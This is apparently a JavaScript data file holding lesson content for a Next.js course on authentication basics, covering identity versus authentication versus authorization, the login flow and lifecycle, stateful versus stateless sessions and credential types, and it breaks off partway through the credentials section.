const nextjsAuthenticationAuthorization = {

/* ===========================
    First Topic : Authentication Basics
============================= */
    "nextjs-authentication-basics": {
    title: "Authentication Basics",
    readingTime: "30 min",
        
    content: [
      {
        heading: "Introduction to Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine opening your banking application. Before you can view your account balance, transfer money, or pay bills, the application asks you to log in."
          },
          {
            type: "paragraph",
            content: "Why?"
          },
          {
            type: "paragraph",
            content: "Because the application must verify who you are before giving you access to sensitive information."
          },
          {
            type: "paragraph",
            content: "This verification process is called Authentication."
          },
          {
            type: "paragraph",
            content: "Authentication is one of the most fundamental concepts in software engineering. Nearly every modern application—from Gmail and GitHub to Netflix, Amazon, Facebook, and your university portal—uses authentication to identify users before granting access."
          },
          {
            type: "paragraph",
            content: "Without authentication, every application would behave like a public website where anyone could access anyone else's private information."
          },
          {
            type: "paragraph",
            content: "Authentication is therefore the first security checkpoint of any application."
          }
        ]
      },
      {
        heading: "A Simple Analogy",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an office building."
          },
          {
            type: "paragraph",
            content: "When you arrive, the security guard asks for your employee ID card."
          },
          {
            type: "paragraph",
            content: "You present the ID card."
          },
          {
            type: "paragraph",
            content: "The guard checks the employee database."
          },
          {
            type: "paragraph",
            content: "If your identity matches:"
          },
          {
            type: "output",
            content: [
              "✅ The gate opens."
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "output",
            content: [
              "❌ Entry is denied."
            ]
          },
          {
            type: "paragraph",
            content: "This is authentication."
          },
          {
            type: "paragraph",
            content: "Notice that the security guard isn't deciding which rooms you can enter—he is only verifying who you are."
          },
          {
            type: "paragraph",
            content: "That distinction becomes very important later when we discuss authorization."
          }
        ]
      },
      {
        heading: "Authentication Everywhere",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication is used almost everywhere."
          },
          {
            type: "paragraph",
            content: "Examples include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Banking applications",
              "Social media",
              "E-commerce websites",
              "Hospital management systems",
              "Government portals",
              "Learning platforms",
              "Cloud services",
              "Gaming platforms",
              "Enterprise software",
              "Mobile applications"
            ]
          },
          {
            type: "paragraph",
            content: "Any application that stores private or personalized information requires authentication."
          }
        ]
      },
      {
        heading: "Why Authentication Exists",
        blocks: [
          {
            type: "paragraph",
            content: "You might wonder:"
          },
          {
            type: "quote",
            content: "Why can't websites simply trust users?"
          },
          {
            type: "paragraph",
            content: "Because the internet is an untrusted environment."
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Anyone can pretend to be someone else.",
              "Anyone can modify browser code.",
              "Anyone can send fake requests.",
              "Anyone can inspect frontend JavaScript."
            ]
          },
          {
            type: "paragraph",
            content: "Authentication exists because servers cannot trust incoming requests by default."
          },
          {
            type: "paragraph",
            content: "Every request must prove the user's identity."
          }
        ]
      },
      {
        heading: "The Problem Without Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an online banking website without authentication."
          },
          {
            type: "paragraph",
            content: "Anyone could visit:"
          },
          {
            type: "output",
            content: [
              "https://bank.com/account"
            ]
          },
          {
            type: "paragraph",
            content: "and immediately see your balance."
          },
          {
            type: "paragraph",
            content: "Or worse:"
          },
          {
            type: "output",
            content: [
              "Transfer ₹500,000"
            ]
          },
          {
            type: "paragraph",
            content: "Without authentication:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "anyone could read private data",
              "anyone could modify information",
              "anyone could delete records",
              "anyone could impersonate another user"
            ]
          },
          {
            type: "paragraph",
            content: "The entire application would become unusable."
          }
        ]
      },
      {
        heading: "Authentication Solves Identity",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication answers one simple question:"
          },
          {
            type: "output",
            content: [
              "Who is making this request?"
            ]
          },
          {
            type: "paragraph",
            content: "It does not answer:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "What can they do?",
              "Which resources can they access?",
              "What permissions do they have?"
            ]
          },
          {
            type: "paragraph",
            content: "Those questions belong to Authorization, which you'll study in a later lesson."
          }
        ]
      },
      {
        heading: "Real-World Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Let's look at how authentication appears in everyday life."
          },
          {
            type: "paragraph",
            content: "Example 1 — ATM Machine"
          },
          {
            type: "flow",
            steps: [
              "Insert ATM Card", "→",
              "Enter PIN", "→",
              "Bank verifies PIN", "→",
              "Access Account"
            ]
          },
          {
            type: "paragraph",
            content: "Your ATM card identifies you."
          },
          {
            type: "paragraph",
            content: "Your PIN authenticates you."
          },
          {
            type: "paragraph",
            content: "Only after successful authentication can you withdraw money."
          },
          {
            type: "paragraph",
            content: "Example 2 — Gmail"
          },
          {
            type: "flow",
            steps: [
              "Email", "→",
              "Password", "→",
              "Google Server", "→",
              "Verify Credentials", "→",
              "Inbox Opens"
            ]
          },
          {
            type: "paragraph",
            content: "Google checks whether your password matches the stored credentials."
          },
          {
            type: "paragraph",
            content: "If correct: Access granted."
          },
          {
            type: "paragraph",
            content: "Otherwise: Login rejected."
          },
          {
            type: "paragraph",
            content: "Example 3 — Netflix"
          },
          {
            type: "flow",
            steps: [
              "Email", "→",
              "Password", "→",
              "Authentication Server", "→",
              "User Account", "→",
              "Watch Movies"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication ensures that only subscribers can access premium content."
          },
          {
            type: "paragraph",
            content: "Example 4 — University Portal"
          },
          {
            type: "flow",
            steps: [
              "Roll Number", "→",
              "Password", "→",
              "University Database", "→",
              "Student Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "The portal verifies your identity before showing grades, attendance, and exam results."
          },
          {
            type: "paragraph",
            content: "Example 5 — GitHub"
          },
          {
            type: "flow",
            steps: [
              "Username", "→",
              "Password", "→",
              "Two-Factor Authentication", "→",
              "Repositories"
            ]
          },
          {
            type: "paragraph",
            content: "GitHub adds another security layer using Multi-Factor Authentication (MFA), which you'll learn about later."
          }
        ]
      },
      {
        heading: "Identity vs Authentication vs Authorization",
        blocks: [
          {
            type: "paragraph",
            content: "These three terms are often confused by beginners."
          },
          {
            type: "paragraph",
            content: "However, they represent completely different concepts."
          },
          {
            type: "paragraph",
            content: "Understanding their differences is essential."
          }
        ]
      },
      {
        heading: "What is Identity?",
        blocks: [
          {
            type: "paragraph",
            content: "Identity answers:"
          },
          {
            type: "output",
            content: [
              "Who are you?"
            ]
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Alice",
              "Bob",
              "Employee #1024",
              "Student ID 220015",
              "User ID 85739"
            ]
          },
          {
            type: "paragraph",
            content: "Identity is simply information that uniquely identifies a user."
          },
          {
            type: "paragraph",
            content: "Examples include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "email address",
              "username",
              "phone number",
              "employee ID",
              "Aadhaar number",
              "passport number"
            ]
          },
          {
            type: "paragraph",
            content: "Identity alone does not prove that the person is genuine."
          },
          {
            type: "paragraph",
            content: "Anyone can claim:"
          },
          {
            type: "quote",
            content: "I am Alice."
          },
          {
            type: "paragraph",
            content: "The server still needs proof."
          }
        ]
      },
      {
        heading: "What is Authentication?",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication answers:"
          },
          {
            type: "output",
            content: [
              "Can you prove you are Alice?"
            ]
          },
          {
            type: "paragraph",
            content: "Proof may include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "password",
              "OTP",
              "fingerprint",
              "face recognition",
              "security key",
              "authentication app"
            ]
          },
          {
            type: "paragraph",
            content: "Only after verification does the server trust the claimed identity."
          }
        ]
      },
      {
        heading: "What is Authorization?",
        blocks: [
          {
            type: "paragraph",
            content: "Authorization answers:"
          },
          {
            type: "output",
            content: [
              "Now that we know you're Alice, what are you allowed to do?"
            ]
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "paragraph",
            content: "Alice:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Read documents",
              "Edit profile",
              "Purchase products"
            ]
          },
          {
            type: "paragraph",
            content: "Administrator:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Delete users",
              "Create accounts",
              "Access reports",
              "Change permissions"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization always happens after authentication."
          }
        ]
      },
      {
        heading: "Understanding the Three Together",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine entering an airport."
          },
          {
            type: "paragraph",
            content: "Step 1"
          },
          {
            type: "paragraph",
            content: "You say:"
          },
          {
            type: "quote",
            content: "I'm John."
          },
          {
            type: "paragraph",
            content: "That is your Identity."
          },
          {
            type: "paragraph",
            content: "Step 2"
          },
          {
            type: "paragraph",
            content: "The officer checks your passport."
          },
          {
            type: "paragraph",
            content: "That is Authentication."
          },
          {
            type: "paragraph",
            content: "Step 3"
          },
          {
            type: "paragraph",
            content: "The officer checks whether you have a boarding pass for the international departure area."
          },
          {
            type: "paragraph",
            content: "That is Authorization."
          }
        ]
      },
      {
        heading: "Another Analogy",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine visiting a hotel."
          },
          {
            type: "paragraph",
            content: "Reception asks:"
          },
          {
            type: "output",
            content: [
              "What is your name?"
            ]
          },
          {
            type: "flow",
            steps: [
              "Identity", "→",
              "They verify your passport.", "→",
              "Authentication", "→",
              "They issue a room key.", "→",
              "Authorization"
            ]
          },
          {
            type: "paragraph",
            content: "Your room key only opens your assigned room—not every room in the hotel."
          }
        ]
      },
      {
        heading: "Comparison Table",
        blocks: [
          {
            type: "table",
            headers: [
              "Concept",
              "Question Answered",
              "Example"
            ],
            rows: [
              [
                "Identity",
                "Who are you?",
                "alice@gmail.com"
              ],
              [
                "Authentication",
                "Can you prove it?",
                "Password or OTP"
              ],
              [
                "Authorization",
                "What can you access?",
                "Admin dashboard"
              ]
            ]
          },
          {
            type: "paragraph",
            content: "One common mistake beginners make is saying:"
          },
          {
            type: "quote",
            content: "Login is authorization."
          },
          {
            type: "paragraph",
            content: "This is incorrect."
          },
          {
            type: "paragraph",
            content: "Logging in is authentication."
          },
          {
            type: "paragraph",
            content: "Authorization begins after login succeeds."
          }
        ]
      },
      {
        heading: "Authentication Workflow",
        blocks: [
          {
            type: "paragraph",
            content: "Let's understand what actually happens when a user logs in."
          },
          {
            type: "paragraph",
            content: "At a high level, the process looks like this:"
          },
          {
            type: "code",
            language: "text",
            content: `          User
            │
            ▼
     Enter Credentials
            │
            ▼
      Send Login Request
            │
            ▼
      Authentication Server
            │
     Verify Credentials
            │
     ┌──────┴──────┐
     │             │
 Invalid        Valid
     │             │
     ▼             ▼
 Error      Create Session/Token
                   │
                   ▼
          Return Authentication
                   │
                   ▼
          User Logged In`
          },
          {
            type: "paragraph",
            content: "Although it appears simple, several important security checks occur behind the scenes."
          }
        ]
      },
      {
        heading: "Step 1 — User Enters Credentials",
        blocks: [
          {
            type: "paragraph",
            content: "The login page collects information such as:"
          },
          {
            type: "output",
            content: [
              "Email",
              "Password"
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "Username",
              "Password"
            ]
          },
          {
            type: "paragraph",
            content: "Some systems also collect:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "phone number",
              "OTP",
              "biometric information",
              "hardware security key"
            ]
          }
        ]
      },
      {
        heading: "Step 2 — Browser Sends Login Request",
        blocks: [
          {
            type: "paragraph",
            content: "The browser sends an HTTPS request."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "POST /login"
            ]
          },
          {
            type: "code",
            language: "json",
            content: `{
  "email":"alice@example.com",
  "password":"mypassword"
}`
          },
          {
            type: "paragraph",
            content: "Notice that credentials travel over HTTPS, not plain HTTP."
          },
          {
            type: "paragraph",
            content: "HTTPS encrypts the communication to prevent attackers from reading sensitive information in transit."
          }
        ]
      },
      {
        heading: "Step 3 — Server Receives the Request",
        blocks: [
          {
            type: "paragraph",
            content: "The authentication server receives the credentials."
          },
          {
            type: "paragraph",
            content: "However, it does not compare the plain-text password directly."
          },
          {
            type: "paragraph",
            content: "Instead, it retrieves the user's stored password hash from the database."
          },
          {
            type: "paragraph",
            content: "(You'll learn password hashing in detail later.)"
          }
        ]
      },
      {
        heading: "Step 4 — Server Verifies Credentials",
        blocks: [
          {
            type: "paragraph",
            content: "The server:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "finds the user",
              "hashes the submitted password",
              "compares it with the stored hash"
            ]
          },
          {
            type: "paragraph",
            content: "If they match:"
          },
          {
            type: "output",
            content: [
              "Authentication succeeds."
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "output",
            content: [
              "Authentication fails."
            ]
          }
        ]
      },
      {
        heading: "Step 5 — Authentication Result",
        blocks: [
          {
            type: "paragraph",
            content: "If successful:"
          },
          {
            type: "output",
            content: [
              "Create Session",
              "or",
              "Generate JWT",
              "or",
              "Issue Authentication Cookie"
            ]
          },
          {
            type: "paragraph",
            content: "This allows the user to remain logged in for future requests without repeatedly entering credentials."
          }
        ]
      },
      {
        heading: "Step 6 — User Accesses Protected Resources",
        blocks: [
          {
            type: "paragraph",
            content: "Subsequent requests include proof of authentication."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "output",
            content: [
              "Cookie",
              "or",
              "JWT Token"
            ]
          },
          {
            type: "paragraph",
            content: "The server verifies this proof before serving protected data."
          }
        ]
      },
      {
        heading: "Visual Authentication Flow",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `+----------------+
|     User       |
+----------------+
        |
        | Login Form
        ▼
+----------------+
|    Browser     |
+----------------+
        |
        | HTTPS Request
        ▼
+----------------------+
| Authentication Server|
+----------------------+
        |
        | Verify Identity
        ▼
+----------------+
|   Database     |
+----------------+
        |
        | User Found?
        ▼
+----------------+
| Verify Password|
+----------------+
        |
  +-----+------+
  |            |
Invalid     Valid
  |            |
  ▼            ▼
Error     Session/JWT
                |
                ▼
         Authenticated User`
          }
        ]
      },
      {
        heading: "Client–Server Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication always involves two parties:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Client",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "Understanding their responsibilities is essential."
          }
        ]
      },
      {
        heading: "What is the Client?",
        blocks: [
          {
            type: "paragraph",
            content: "The client is the application used by the user."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Web browser",
              "Mobile app",
              "Desktop application"
            ]
          },
          {
            type: "paragraph",
            content: "The client is responsible for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "collecting credentials",
              "sending login requests",
              "storing authentication information (session cookie or token)",
              "including authentication information in future requests"
            ]
          },
          {
            type: "paragraph",
            content: "The client should never decide whether a user is authenticated. It only presents credentials and stores the server-issued proof."
          }
        ]
      },
      {
        heading: "What is the Server?",
        blocks: [
          {
            type: "paragraph",
            content: "The server is the trusted authority."
          },
          {
            type: "paragraph",
            content: "It is responsible for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "verifying user credentials",
              "checking password hashes",
              "accessing the database",
              "creating sessions or tokens",
              "enforcing authentication rules",
              "rejecting invalid requests"
            ]
          },
          {
            type: "paragraph",
            content: "The server never trusts data sent by the client without verification."
          }
        ]
      },
      {
        heading: "Client–Server Authentication Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                  Client
          (Browser / Mobile App)
                     │
      Enter Email & Password
                     │
                     ▼
            HTTPS Login Request
                     │
                     ▼
          Authentication Server
                     │
          Verify Credentials
                     │
                     ▼
               User Database
                     │
      Password Hash Comparison
                     │
        ┌────────────┴────────────┐
        │                         │
     Invalid                  Valid
        │                         │
        ▼                         ▼
 Login Failed      Create Session / JWT
                                  │
                                  ▼
                     Return Authentication
                                  │
                                  ▼
                    Client Stores Proof
                                  │
                                  ▼
              Future Authenticated Requests`
          }
        ]
      },
      {
        heading: "Why the Server Must Be Trusted",
        blocks: [
          {
            type: "paragraph",
            content: "One of the most important principles in web security is:"
          },
          {
            type: "quote",
            content: "Never trust the client. Always trust the server."
          },
          {
            type: "paragraph",
            content: "A user can:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "modify browser JavaScript",
              "intercept requests",
              "send fake HTTP requests",
              "edit HTML forms",
              "manipulate API payloads"
            ]
          },
          {
            type: "paragraph",
            content: "The server must independently verify every authentication request."
          },
          {
            type: "paragraph",
            content: "This principle underpins the security of every modern web application, including those built with Next.js."
          }
        ]
      },
      {
        heading: "Advantages of Authentication",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Protects sensitive user data.",
              "Prevents unauthorized access.",
              "Enables personalized experiences.",
              "Forms the foundation for authorization and permissions.",
              "Supports secure transactions and user accountability.",
              "Allows audit logging and activity tracking."
            ]
          }
        ]
      },
      {
        heading: "Limitations",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication alone does not solve every security problem:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "It does not determine what users can access (authorization is required).",
              "Weak passwords remain vulnerable to brute-force attacks.",
              "Compromised credentials can still be misused.",
              "Additional measures such as MFA, secure sessions, and authorization are needed for comprehensive security."
            ]
          }
        ]
      },
      {
        heading: "When Authentication Is Needed",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication should be implemented whenever an application manages user-specific or sensitive operations, including:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User accounts and profiles",
              "Banking and financial services",
              "E-commerce order history",
              "Healthcare records",
              "Educational portals",
              "Administrative dashboards",
              "SaaS applications",
              "Internal enterprise systems",
              "Content management systems",
              "APIs that expose private resources"
            ]
          },
          {
            type: "paragraph",
            content: "Public informational websites, such as documentation pages or blogs, generally do not require authentication for basic viewing, though administrative interfaces for managing content certainly do."
          }
        ]
      },
      
      {
        heading: "Authentication Lifecycle",
        blocks: [
          {
            type: "paragraph",
            content: "In the previous lesson, you learned that authentication verifies who a user is. However, authentication is not a single event that happens only during login. Instead, it is an ongoing process that begins when a user signs in and ends when they log out or their session expires."
          },
          {
            type: "paragraph",
            content: "This complete journey is called the Authentication Lifecycle."
          },
          {
            type: "paragraph",
            content: "Understanding this lifecycle is essential because every authentication system—whether in Next.js, React, Node.js, Spring Boot, Django, or any other framework—follows the same fundamental stages."
          }
        ]
      },
      {
        heading: "What is the Authentication Lifecycle?",
        blocks: [
          {
            type: "paragraph",
            content: "The Authentication Lifecycle is the complete sequence of events that occurs from the moment a user attempts to log in until they are logged out or their authentication expires."
          },
          {
            type: "paragraph",
            content: "It includes:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Identity submission",
              "Credential verification",
              "Authentication decision",
              "Session or token creation",
              "Accessing protected resources",
              "Session validation",
              "Session renewal (optional)",
              "Logout",
              "Session destruction"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of thinking of authentication as \"logging in,\" think of it as a continuous conversation between the client and the server."
          }
        ]
      },
      {
        heading: "High-Level Authentication Lifecycle",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                User Opens Website
                        │
                        ▼
               Login Form Displayed
                        │
                        ▼
             User Enters Credentials
                        │
                        ▼
            Browser Sends HTTPS Request
                        │
                        ▼
           Authentication Server Verifies
                        │
              ┌─────────┴─────────┐
              │                   │
          Invalid             Valid
              │                   │
              ▼                   ▼
      Show Login Error      Create Session/JWT
                                  │
                                  ▼
                    Access Protected Resources
                                  │
                                  ▼
                   Validate Authentication
                                  │
                                  ▼
                    Session Expires / Logout
                                  │
                                  ▼
                     Destroy Authentication`
          },
          {
            type: "paragraph",
            content: "Every modern authentication system follows this flow in one form or another."
          }
        ]
      },
      {
        heading: "Stage 1 — User Identification",
        blocks: [
          {
            type: "paragraph",
            content: "The first step is identifying who the user claims to be."
          },
          {
            type: "paragraph",
            content: "The login form usually asks for an identifier such as:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Email address",
              "Username",
              "Phone number",
              "Employee ID",
              "Student ID"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Email:",
              "alice@example.com"
            ]
          },
          {
            type: "paragraph",
            content: "At this point, the server still doesn't know whether this person is actually Alice."
          },
          {
            type: "paragraph",
            content: "The user has only claimed an identity."
          }
        ]
      },
      {
        heading: "Stage 2 — Credential Submission",
        blocks: [
          {
            type: "paragraph",
            content: "Next, the user submits proof of identity."
          },
          {
            type: "paragraph",
            content: "This proof is called credentials."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Email:",
              "alice@example.com",
              "",
              "Password:",
              "********"
            ]
          },
          {
            type: "paragraph",
            content: "The browser packages these credentials into an HTTPS request."
          },
          {
            type: "code",
            language: "text",
            content: `POST /login

{
  "email":"alice@example.com",
  "password":"mypassword"
}`
          },
          {
            type: "paragraph",
            content: "Notice that passwords should never travel over plain HTTP."
          },
          {
            type: "paragraph",
            content: "Always use HTTPS."
          }
        ]
      },
      {
        heading: "Stage 3 — Credential Verification",
        blocks: [
          {
            type: "paragraph",
            content: "The server receives the request."
          },
          {
            type: "paragraph",
            content: "Now it performs several checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Does this user exist?",
              "Is the account active?",
              "Is the password correct?",
              "Is the account locked?",
              "Has MFA been enabled?"
            ]
          },
          {
            type: "paragraph",
            content: "Internally, the server compares the password hash stored in the database with the hash of the submitted password."
          },
          {
            type: "paragraph",
            content: "If everything matches:"
          },
          {
            type: "output",
            content: [
              "Authentication succeeds."
            ]
          },
          {
            type: "paragraph",
            content: "Otherwise:"
          },
          {
            type: "output",
            content: [
              "Authentication fails."
            ]
          }
        ]
      },
      {
        heading: "Stage 4 — Authentication Success",
        blocks: [
          {
            type: "paragraph",
            content: "If verification succeeds, the server creates authentication information."
          },
          {
            type: "paragraph",
            content: "This might be:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session ID",
              "Session Cookie",
              "JWT",
              "Access Token",
              "Refresh Token"
            ]
          },
          {
            type: "paragraph",
            content: "Example response:"
          },
          {
            type: "output",
            content: [
              "HTTP 200 OK",
              "",
              "Set-Cookie:",
              "session=abc123..."
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "code",
            language: "json",
            content: `{
  "token": "eyJhbGciOi..."
}`
          },
          {
            type: "paragraph",
            content: "The user is now authenticated."
          }
        ]
      },
      {
        heading: "Stage 5 — Accessing Protected Resources",
        blocks: [
          {
            type: "paragraph",
            content: "Instead of asking for the password again, future requests include the authentication proof."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "GET /dashboard",
              "",
              "Cookie:",
              "session=abc123..."
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "Authorization:",
              "Bearer eyJhbGciOi..."
            ]
          },
          {
            type: "paragraph",
            content: "The server validates this information before returning protected data."
          }
        ]
      },
      {
        heading: "Stage 6 — Continuous Validation",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication is not permanent."
          },
          {
            type: "paragraph",
            content: "Every protected request is validated."
          },
          {
            type: "paragraph",
            content: "The server checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Is the session valid?",
              "Has the token expired?",
              "Has the account been disabled?",
              "Has the user logged out elsewhere?"
            ]
          },
          {
            type: "paragraph",
            content: "Only after validation does the server process the request."
          }
        ]
      },
      {
        heading: "Stage 7 — Session Renewal",
        blocks: [
          {
            type: "paragraph",
            content: "Many applications automatically renew authentication."
          },
          {
            type: "paragraph",
            content: "For example:"
          },
          {
            type: "flow",
            steps: [
              "Netflix", "→",
              "Watching movies continuously", "→",
              "Session expires soon", "→",
              "Server silently refreshes authentication", "→",
              "User never notices"
            ]
          },
          {
            type: "paragraph",
            content: "This improves user experience while maintaining security."
          }
        ]
      },
      {
        heading: "Stage 8 — Logout",
        blocks: [
          {
            type: "paragraph",
            content: "When the user clicks:"
          },
          {
            type: "output",
            content: [
              "Logout"
            ]
          },
          {
            type: "paragraph",
            content: "the application:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "removes the authentication cookie",
              "invalidates the session",
              "deletes refresh tokens",
              "redirects to the login page"
            ]
          }
        ]
      },
      {
        heading: "Stage 9 — Authentication Ends",
        blocks: [
          {
            type: "paragraph",
            content: "Once the session is destroyed:"
          },
          {
            type: "flow",
            steps: [
              "Protected Page", "→",
              "Authentication Required", "→",
              "Redirect to Login"
            ]
          },
          {
            type: "paragraph",
            content: "The lifecycle starts again."
          }
        ]
      },
      {
        heading: "Authentication Lifecycle in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "In a Next.js application, the lifecycle typically looks like this:"
          },
          {
            type: "flow",
            steps: [
              "Login Page", "→",
              "Server Action / API Route", "→",
              "Database", "→",
              "Password Verification", "→",
              "Create Session/JWT", "→",
              "Cookie Stored", "→",
              "Middleware", "→",
              "Protected Route", "→",
              "Logout", "→",
              "Delete Cookie", "→",
              "Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "You'll build this complete flow later in this Authentication section."
          }
        ]
      },
      {
        heading: "Stateful vs Stateless Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "One of the most important design decisions in authentication is where the login state is stored."
          },
          {
            type: "paragraph",
            content: "There are two approaches:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Stateful Authentication",
              "Stateless Authentication"
            ]
          },
          {
            type: "paragraph",
            content: "Understanding this distinction is crucial because it influences scalability, performance, and security."
          }
        ]
      },
      {
        heading: "What is Stateful Authentication?",
        blocks: [
          {
            type: "paragraph",
            content: "In stateful authentication, the server stores information about the logged-in user."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User Logs In", "→",
              "Server Creates Session", "→",
              "Session Stored", "→",
              "Session ID Returned", "→",
              "Browser Sends Session ID"
            ]
          },
          {
            type: "paragraph",
            content: "The actual session data remains on the server."
          },
          {
            type: "paragraph",
            content: "The client only stores a reference (usually a session cookie)."
          }
        ]
      },
      {
        heading: "Stateful Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `Browser
    │
Session Cookie
    │
    ▼
Server
    │
Session ID
    │
    ▼
Session Store
(Redis / Database)`
          },
          {
            type: "paragraph",
            content: "The server remembers every logged-in user."
          },
          {
            type: "paragraph",
            content: "Advantages"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Easy logout",
              "Easy session invalidation",
              "Better control",
              "Easier permission updates",
              "More secure revocation"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Server memory usage",
              "Session storage required",
              "Harder horizontal scaling",
              "Requires distributed session stores"
            ]
          }
        ]
      },
      {
        heading: "What is Stateless Authentication?",
        blocks: [
          {
            type: "paragraph",
            content: "In stateless authentication, the server stores nothing about logged-in users."
          },
          {
            type: "paragraph",
            content: "Instead, authentication data is stored inside a signed token."
          },
          {
            type: "paragraph",
            content: "Usually:"
          },
          {
            type: "output",
            content: [
              "JWT (JSON Web Token)"
            ]
          },
          {
            type: "paragraph",
            content: "Flow:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Server Generates JWT", "→",
              "Browser Stores JWT", "→",
              "Future Requests Include JWT", "→",
              "Server Verifies Signature"
            ]
          },
          {
            type: "paragraph",
            content: "No session database lookup is needed for every request."
          }
        ]
      },
      {
        heading: "Stateless Architecture",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "JWT", "→",
              "Server", "→",
              "Verify Signature", "→",
              "Return Response"
            ]
          },
          {
            type: "paragraph",
            content: "The server doesn't remember users."
          },
          {
            type: "paragraph",
            content: "The token carries the necessary authentication information."
          },
          {
            type: "paragraph",
            content: "Advantages"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Highly scalable",
              "No session database",
              "Easy microservice integration",
              "Faster validation",
              "Better for distributed systems"
            ]
          },
          {
            type: "paragraph",
            content: "Disadvantages"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Harder logout",
              "Token revocation is complex",
              "Larger request size",
              "Token theft risks",
              "Refresh tokens often required"
            ]
          }
        ]
      },
      {
        heading: "Stateful vs Stateless Comparison",
        blocks: [
          {
            type: "table",
            headers: ["Feature", "Stateful", "Stateless"],
            rows: [
              ["Server stores session", "✅ Yes", "❌ No"],
              ["Uses Session ID", "✅ Yes", "❌ No"],
              ["Uses JWT", "❌ Usually No", "✅ Yes"],
              ["Easy logout", "✅ Yes", "⚠ Harder"],
              ["Easy scaling", "❌ Moderate", "✅ Excellent"],
              ["Server memory", "Higher", "Lower"],
              ["Microservices", "Less suitable", "Excellent"]
            ]
          },
          {
            type: "paragraph",
            content: "Neither approach is universally better—the choice depends on your application's requirements."
          }
        ]
      },
      {
        heading: "What are Credentials?",
        blocks: [
          {
            type: "paragraph",
            content: "Credentials are the pieces of information a user provides to prove their identity."
          },
          {
            type: "paragraph",
            content: "Think of credentials as digital evidence."
          },
          {
            type: "paragraph",
            content: "Without credentials, authentication cannot occur."
          }
        ]
      },
      {
        heading: "Common Types of Credentials",
        blocks: [
          {
            type: "paragraph",
            content: "Something You Know"
          },
          {
            type: "paragraph",
            content: "Knowledge-based credentials."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Password",
              "PIN",
              "Security questions"
            ]
          },
          {
            type: "paragraph",
            content: "Something You Have"
          },
          {
            type: "paragraph",
            content: "Possession-based credentials."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Phone",
              "OTP device",
              "Smart card",
              "Security key (FIDO2/WebAuthn)",
              "Authenticator app"
            ]
          },
          {
